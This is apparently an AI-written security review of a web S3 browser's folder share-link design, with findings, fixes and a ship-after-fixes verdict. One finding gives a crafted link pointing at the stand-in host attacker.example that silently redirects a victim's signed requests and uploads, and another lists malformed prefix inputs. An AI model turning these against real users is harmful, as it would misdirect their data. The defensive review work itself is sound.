# Prefix access — security & privacy review (lane 30)

**Date:** 2026-09-16 · **Reviewer:** security persona (read-and-probe only) · **Tree:** `main` @ `0b24aea` (v1.62.3), clean ·
**Input contract:** `docs/review-prefix-access/00-facts.md` · **Prompted by:** pre-implementation design of (A) folder share
links carrying `prefix` and (B) the prefix-restricted-key connect-failure explanation.

Line numbers are from `0b24aea`. "Demonstrated" means I ran it (node-level unless stated); "plausible-unverified" means the
code trace is complete but I did not execute the path end-to-end.

---

## Rotation / incident items

**None found.** What I checked, so the negative is meaningful:

- Tracked non-test source swept for credential-shaped literals (`AKIA…`, B2 key shapes, inline `secretKey:` strings).
  Only hit: AWS's canonical documentation example pair (`AKIAIOSFODNN7EXAMPLE` / `wJalrXUtnFEMI…EXAMPLEKEY`) in
  `docs/review-download-parity/probe/presign/entry.js:44,56` — a published example, not a secret.
- `.claude-scratch/` is gitignored (`.gitignore:11`); the facts brief's screenshot/capture scripts under it are untracked.
- No hash-serializing network path exists today (see Q2 below): `<meta name="referrer" content="no-referrer">`
  (`src/index.html:8`, `dist/index.html:276`) plus the fact that `fetch()` strips fragments before sending. The one
  `window.location.href` consumer (`src/components/IntegrityCheck.jsx:108` → `src/lib/integrity.js:47`) fetches the page
  URL itself; the fragment is dropped by the Fetch spec, not by app code.

---

## Surface reviewed

| Area | Files (read in full unless noted) |
|---|---|
| Hash-param read/build/history | `src/lib/url-params.js`, `src/lib/share-url.js`, `src/lib/base-prefix.js`, `src/main.jsx` |
| Prefix intake and navigation | `src/components/Browser.jsx` 1–120, 300–440, 1140–1165, 1435–1475; `src/lib/list-objects.js`; `src/lib/useNewFolder.js`; `src/components/UploadQueue.jsx` 140–165, 228–245; `src/components/Breadcrumb.jsx` |
| Credential merge / persist paths | `src/components/App.jsx` 180–220, 300–370, 415–500, 500–620, 1300–1425, 1595–1640; `src/lib/storage.js` (credential functions); `src/lib/credential-validation.js`; `src/lib/s3-client.js` (region) |
| Link UI | `src/components/ShareLinkMenu.jsx`, `src/components/CopyLinkPopover.jsx`, `src/components/DownloadPage.jsx` (URL uses) |
| Failure explanation | `src/components/ErrorBlock.jsx`, `src/lib/connection-diagnostics.js`, `src/lib/format.js` 40–70, `src/components/SetupGuide.jsx` (CORS origin) |
| Page policy | `src/index.html` CSP + referrer; `dist/index.html` head |
| Prior claims | `docs/superpowers/specs/2026-08-13-prefix-scoped-keys-design.md`, `docs/superpowers/specs/2026-07-10-copy-link-with-key-id-design.md` — all stated security properties re-verified in code (secret structurally excluded from `buildShareUrl` at `url-params.js:75-87`; keyId validated `:44-48`; basePrefix validated `:52-60`; hash-only). They still hold. |
| Harness | `test/e2e/browser/prefix-scope.test.mjs` 1–80, `test/e2e/mock-s3/server.mjs` (denial codes), `test/e2e/harness.mjs` exports |

Raw-HTML sinks: `grep` for `dangerouslySetInnerHTML|innerHTML|document.title|insertAdjacentHTML` across `src/` returns
nothing. All prefix/folder text renders through Preact text nodes or attribute setters.

---

## Findings (ordered by severity)

### F1 — Medium · existing, amplified by A · plausible-unverified
**A share link loaded into a tab that still holds a secret auto-connects to the link's endpoint with that secret.**

*Actor → path → impact.* An attacker (or an honest but stale link) supplies
`https://bucketer.host/?x#endpoint=https://attacker.example&bucket=b`. If that URL is loaded as a **full navigation** in a
tab whose `sessionStorage` holds a secret (same-tab reload after paste; a duplicated tab — Chromium and Firefox clone
`sessionStorage` on duplicate; the `?x` defeats the fragment-only/hashchange path), the mount effect merges the URL over
the stored credentials and calls `handleConnect` with no click: `App.jsx:575-576` builds
`merged = { ...base, ...fromUrl }`, `:595` calls `handleConnect(merged)` when endpoint/bucket/keyId/secretKey are all
present, and `:320` `saveCredentials(fullCreds)` persists the link's endpoint/bucket/basePrefix to the flat mirror.
`readUrlParams` accepts any `http:`/`https:` endpoint by design (`url-params.js:24-31`). Result: the victim's key ID and a
SigV4-signed ListObjects go to the attacker's host (signature is host-bound and not replayable elsewhere, so the secret
does not leak); the attacker's endpoint controls its own CORS, so it can serve a plausible listing and **receive whatever
the victim then uploads** or serve arbitrary downloads.

*Benign variant, same code.* After a quick-switch (`switchToConnection`, `App.jsx:1306-1324`) nothing rewrites the hash —
the only history writers in `src/` are `url-params.js:101-102`, and `pushPrefixHistory` preserves every other param
(`:96-99`). So a tab opened from link A (endpoint/bucket/basePrefix of A) that is switched to saved connection B and then
reloaded merges A's endpoint/bucket/basePrefix over B's stored key + secret and auto-connects B's credentials to A's
target. At best a confusing 403; at worst the cross-account signing above.

*Why it matters more now.* Feature A multiplies the number of hash-bearing links in circulation and the number of tabs
whose address bar carries a stale connection.

*Smallest fix (hash-only, no deps).* Auto-connect only when the URL does not change the connection: in the mount effect,
if `fromUrl` has any key whose value differs from `base` (endpoint, bucket, keyId, basePrefix, regionOverride), skip
`handleConnect(merged)` and fall through to the pre-filled form with the existing `urlParamsPresent` banner. This keeps
the legitimate "reload my share-link tab" path (values equal) and removes the silent swap. Optionally clear the stale
connection params from the hash on `switchToConnection` (one `replaceState` via a small sibling of `pushPrefixHistory`).

### F2 — Medium-Low · design A extends this · demonstrated (unit) / plausible-unverified (browser)
**`prefix` from the hash is not normalized or validated; a crafted link can make "New folder" write to a mangled key and make the breadcrumb lie.**

*Evidence.* Browser reads `prefix` raw in three independent places (`Browser.jsx:72`, `:81`, `:427`) and only calls
`clampToFloor` (`base-prefix.js:34-36`), which is `startsWith`, not normalization. `readUrlParams` deliberately does not
handle `prefix` (`url-params.js:66-69` lists it nowhere). Run against the real module:

```
clampToFloor('clients/acme', '')                 → 'clients/acme'      (no trailing slash passes)
clampToFloor('clients/acme/sub', 'clients/acme/') → 'clients/acme/sub'  (in-floor, still unnormalized)
clampToFloor('../', '')                          → '../'
clampToFloor('a\\b/', '')                        → 'a\\b/'
clampToFloor('x'*5000 + '/', '')                 → passes (5001 chars; S3 key max is 1024)
```

Downstream: `useNewFolder.js:35` composes `key = prefix + name + '/'` with no slash repair — with `prefix=clients/acme`
the user's "New folder → Reports" PUTs the marker `clients/acmeReports/`, a sibling outside the folder they believe they
are in. Uploads are safe (`UploadQueue.jsx:160-161` and `:234-237` append the missing `/`). Listing sends the raw
string as `Prefix` (`list-objects.js:19`) so `clients/acme` lists `clients/acme/`, `clients/acme-old/` and
`clients/acme.txt` together while the breadcrumb (`Breadcrumb.jsx:44-63`) shows `clients / acme` as if inside a folder.
`basePrefix` already rejects `\`, `..` and >1024 (`url-params.js:57`, `credential-validation.js:37-39`); `prefix` gets
none of that. `..` and `\` are not path traversal here (the SDK puts the prefix in the query string, and a later
path-style GET of a `../`-keyed object would fail SigV4 because S3 does not normalize the canonical URI), so the impact
is integrity of the victim's own writes plus UI misrepresentation, not confidentiality.

*Also.* An out-of-scope `prefix` sent to a recipient with a scoped key **and no Base folder set** turns the initial
listing failure into a whole-connection failure (`Browser.jsx:395-405` → `onInitialListFailed` on the first listing) with
the "set Base folder" hint — the link makes a working key look broken.

*Smallest fix.* Move `prefix` intake into `readUrlParams`-style code with the exact `basePrefix` rule (cap 1024, reject
`\` and `..` segments, `normalizeBasePrefix`), and have all three Browser read sites call it. Any folder-link builder must
emit the normalized `currentPrefix` (always `/`-terminated by contract). For the initial-listing case, when a
link-supplied non-floor prefix 403s on the very first listing, retry once at the floor before declaring the connection
failed (one deterministic request, not a probe).

### F3 — Low-Medium · design A/B · plausible-unverified
**A link-supplied `basePrefix` silently rewrites the stored floor.**

*Paths.* (1) Mount auto-connect (F1's path) persists it via `saveCredentials` (`App.jsx:320`, flat mirror
`s3b_base_prefix`), so the next launch without a hash uses the link's floor (`:575` prefers flat over the connection
record). (2) Disconnect re-fills from `{ ...conn, ...fromUrl }` (`App.jsx:496`), so the form shows the link's floor over
the record's. (3) Hashchange while not connected merges it into `credentials` and `liveFormData` (`:521-528`); a later
"Save" writes `normalizeBasePrefix(liveFormData.basePrefix)` into the connection record (`:1337`, `:1364`). The
pre-fill banner (`App.jsx:1613-1617`) says "Endpoint and bucket pre-filled from URL" — it never mentions Base folder, so
the user has no cue that the floor came from the link. Server-side the key still bounds access (widening past the key
just 403s), so this is a silent change to a self-imposed safety rail, not a bypass. It matters for an unscoped key
where the operator uses Base folder as a guard rail against touching other data.

*Smallest fix.* Covered by F1's "no auto-connect on differing values". Plus: the banner enumerates what the link set
(`Base folder: team/` when present), and "Save" on a form whose `basePrefix` differs from the selected record's is
labelled as an update to the floor.

### F4 — Low-Medium · design A · design risk (no code yet)
**Two link kinds, three "Copy link" controls, one phrase.**

Today: header `ShareLinkMenu` button text "Copy link" (`ShareLinkMenu.jsx:48-50`) makes a *connection* link; the file
row's button `title="Copy link"` (`Browser.jsx:1622`; preview `:1117`; batch `:1240`) opens `CopyLinkPopover`, which
makes **presigned credentials** and, under the same popover, a `#dl=` "Share via Bucketer" link (`CopyLinkPopover.jsx:
127-132`). Both link kinds are `https://bucketer.host/#…` and are indistinguishable to a recipient before clicking. A
folder-row copy action placed beside the file-row action, with the same glyph/title, is the exact confusion point:
a sender who just copied a 7-day presigned link for a file will assume the folder link also "works without a key" (and
may send it to someone who has no key), or conversely will withhold a harmless folder link believing it exposes data.

*Code paths that must not blur.* (a) The folder link must be built from `credentials` + normalized `currentPrefix`
via `buildShareUrl`, **never from `window.location.href`/the address bar** — the address bar preserves `keyId`,
`basePrefix`, and stale connection params across navigation (`url-params.js:96-99`), so "copy current URL" would leak the
opt-in key ID silently and defeat the 2026-07-10 design's opt-in property. (b) Do not reuse `CopyLinkPopover` for
folders. (c) If the header menu gains the folder, its item labels must say so ("Connection + this folder …") and the
toast must say the recipient needs their own key; "Connection only (no credentials)" cannot remain the label of a link
that now names a folder.

### F5 — Low · design A · privacy declaration (rate honestly)
**Folder names in links are a small, real regression in what a link discloses — and browser history already carries them.**

What a link says today: endpoint + bucket (+ key ID, opt-in). With A: + a folder path. In this fleet a folder path can
be person-level (`students/<name>/`, `guardians/<family>/`), where a bucket name is org-level. That is a change in kind.
Mitigating facts, all verified: the fragment never reaches any server via the app (referrer `no-referrer`, fetch strips
fragments, no `location.href` serialization other than IntegrityCheck's same-origin self-fetch); the recipient still
needs a key; and `pushPrefixHistory` (`url-params.js:94-105`) has written `#prefix=<folder>` into **both sender's and
recipient's** browser history on every navigation since v1.14 — so history exposure is not new. The net-new exposure is
the transport the sender chooses (chat, email, ticket) and clipboard managers. Not a blocker; must be a labelled choice
(not silent inclusion) and must never be combined with `keyId` except through the existing explicit item.

One caveat the earlier designs did not state: browser history **sync** (Chrome/Firefox accounts) uploads URLs including
fragments to the sync provider. That already applies to `#prefix=` and to the opt-in `keyId` variant. Recorded as a
question for the operator below; not a finding against this design.

### F6 — Low · design B · demonstrated (code) / harness cannot represent
**The Base-folder hint fires on any 401/403, including wrong-secret errors; the CORS verdict cannot see a scoped key; probes must stay non-speculative.**

- `ErrorBlock.jsx:38-39`: `isDeniedLike = code === 'AccessDenied' || status === 403 || status === 401`. AWS and B2
  return 403 for `SignatureDoesNotMatch` and `InvalidAccessKeyId` too, so the "set Base folder" note is shown to a user
  whose secret is simply mistyped. Today's copy hedges ("This can mean the credentials are simply wrong"), which is
  acceptable. **If B makes the hint an inline affordance or a stronger verdict, it must gate on `parsed.code ===
  'AccessDenied'` (plus unknown-code 403) and explicitly not on `SignatureDoesNotMatch`/`InvalidAccessKeyId`**; otherwise
  it sends wrong-credential users to change a field that cannot help. Harness note: the mock emits only `AccessDenied`
  (`test/e2e/mock-s3/server.mjs:157,611`); a spec cannot prove the negative without adding those codes to the mock.
- `connection-diagnostics.js:147`: all-probes-pass → `cors-blocked`, whose message (`:26-27`) says "almost certainly
  missing or incorrect CORS configuration". On the operator's likeliest wire shape (CORS-masked 403 from a scoped key)
  that is a confident wrong answer. Security impact is low: the SetupGuide's CORS template uses the page origin
  (`SetupGuide.jsx:24-27`, `:92-100`), so a user who "fixes CORS" widens nothing beyond this app's origin (the `*`
  fallback exists only on `file://`, `:169-171`, pre-existing). The harm is misdirection and wasted time. Fix: when
  `basePrefixUnset`, the verdict copy must carry the scoped-key alternative, and the verdict id should be honest that
  all-pass cannot distinguish CORS from a masked denial.
- Probes: the existing checks are `HEAD` with `mode: 'no-cors'` to the endpoint origin and `bucket.host`
  (`:53`, `:135`) — unauthenticated, no path, no key, no Referer. They leak only "this IP touched this bucket hostname",
  which the real request already leaks. Safe. **Any new probe that sends signed requests to guess the key's scope
  (iterating top-level prefixes) is enumeration against the user's own key**: no third-party disclosure, but each denial
  is a failed-auth event in the provider's audit log (CloudTrail `AccessDenied`, B2 event log) and can trip
  customer-side alerting. Design rule: derive the verdict from the error code of the one listing already made; at most
  one additional deterministic request (e.g. re-list at the floor), user-triggered, never a loop.
- Information disclosure to an unauthenticated or wrong-key party: **no scenario found.** Every listing is a signed
  request; S3 returns 200-empty for a nonexistent in-scope prefix and 403 for out-of-scope, so the only party that can
  learn "prefix X is in my scope" is the key holder. "Provider response details" (`ErrorBlock.jsx:94-105`) shows
  code/status/requestId/message — no key material.

### F7 — Low · existing hardening gap · plausible-unverified
**`region` is the one hash param read raw.** `url-params.js:51` assigns `p.get('region')` with no length/whitespace check;
it reaches `createS3Client` (`s3-client.js:12`) and the SigV4 credential scope. Form validation (`credential-validation.js:
34`) only runs on submit, and F1's auto-connect path bypasses the form. A value with a newline makes `fetch` throw on the
header (fails closed); a benign-looking wrong region yields `SignatureDoesNotMatch`. No exploit; it breaks the stated
pattern. Fix: same `\s`/length guard as `keyId`.

---

## The six questions, answered

1. **Injection via `prefix`.** Demonstrated: unnormalized and unbounded values pass the clamp (F2), with a concrete
   integrity consequence in `useNewFolder.js:35` and a misleading breadcrumb. **No XSS**: no raw-HTML sinks in `src/`;
   `Breadcrumb.jsx`, the clamp notice (`Browser.jsx:1145-1148`, which renders the *floor*, not the link value), and folder
   rows are text nodes/attributes. **No traversal**: prefix goes into the ListObjects query string. **No expensive
   listing**: one page, always `Delimiter: '/'`, `MaxKeys` from settings; a prefix cannot make it costlier than root. A
   prefix pointing at someone else's folder is bounded by the recipient's key (403) — but see F2's "working key looks
   broken" corollary.
2. **Leakage.** Verified no network path for the fragment (referrer policy, fetch fragment-stripping, `IntegrityCheck`
   self-fetch, `UpdateBanner` fetches `pathname?_v=`). Honest rating in F5: small regression in link content, transport
   channel is the net-new exposure, history exposure pre-exists; history sync is an unstated existing caveat.
3. **Confusion.** F4 names the controls and the two rules that keep the kinds apart (build from state, not address bar;
   never reuse `CopyLinkPopover`). No existing *code path* blurs them — `main.jsx:17-18` routes `dl` before anything
   else — the risk is entirely in the sender-side UI the design will add.
4. **Recipient floor.** Out-of-floor `prefix` clamps correctly (`Browser.jsx:72-74`, `navigateTo` `:319`). A
   link-supplied `basePrefix` is not clamped by anything and is persisted silently on three paths (F3), and the
   mount-time merge can auto-connect stored credentials to link-supplied targets (F1). Save path traced:
   `handleSaveProfile` writes `liveFormData.basePrefix` (`App.jsx:1337`, `:1364`) with a banner that does not name it.
5. **Failure hint / diagnostics.** F6: no disclosure to non-key-holders; existing probes are safe; a new probe strategy
   must not enumerate; the hint's 401/403 gate is too wide to be strengthened as-is; `cors-blocked` is a low-security,
   high-confusion misdirection.
6. **Already exposed.** Nothing to rotate. F1 and F7 are pre-existing gaps in the code the design extends.

---

## Questions for the operator

1. Do any real buckets in scope use person-identifying folder names (students, guardians, families)? If yes, F5's
   "labelled choice" becomes a firmer requirement, and the README's storage/privacy section should say that folder
   links and the address bar's `#prefix=` can carry such names into browser history and history sync.
2. Is browser history sync (Chrome/Firefox account sync) in use on operator/staff machines that open key-ID links? It
   uploads fragments; the 2026-07-10 design's "lands in the recipient's browser history" understates this.
3. Is the "reload a share-link tab and auto-reconnect" behaviour relied on (F1's fix preserves it only when the URL
   values equal the stored ones)? If nobody depends on it at all, the simpler fix is "URL params present → never
   auto-connect".
4. Which wire shape does a real B2 Name-Prefix denial take in the browser (readable 403 `AccessDenied` vs CORS-masked
   TypeError)? Only a live probe with a restricted key settles F6's gating and the verdict copy; the mock cannot.
5. Does the provider's audit/alerting (CloudTrail alarms, B2 event notifications) fire on repeated `AccessDenied` from
   one key? This decides whether any multi-request probe strategy is acceptable at all.

---

## Verdict

**Ship-after-fixes.** The design must include, before shipping:

1. **F2** — `prefix` intake normalized and validated with the `basePrefix` rule (cap 1024, reject `\` and `..`,
   `normalizeBasePrefix`) at a single read site used by all three Browser entry points; the folder-link builder emits the
   normalized `currentPrefix`.
2. **F4** — folder links built from `credentials` + `currentPrefix` via `buildShareUrl`, never from the address bar;
   `keyId` remains reachable only through the existing explicit item; labels and toasts state that a folder is included
   and that the recipient needs their own key; no reuse of `CopyLinkPopover` for folders.
3. **F6** — any strengthened hint/affordance gates on `AccessDenied` (not bare 401/403); the `cors-blocked` verdict
   carries the scoped-key alternative when `basePrefixUnset`; no speculative signed probes (at most one deterministic
   re-list at the floor, user-triggered).
4. **F1 + F3** — the mount-time merge must not auto-connect when link-supplied values differ from the stored connection;
   the pre-fill banner names Base folder when the link set it. This is pre-existing, but the feature exists to put more
   of these links in circulation, and the fix is a comparison in one effect. If the operator prefers to track it as its
   own issue, the design must say so explicitly rather than inherit it silently.

Should-fix in the same arc, not blocking: F7 (`region` guard); the harness gains `SignatureDoesNotMatch`/`InvalidAccessKeyId`
so the F6 negative is testable; README privacy note per Question 1.
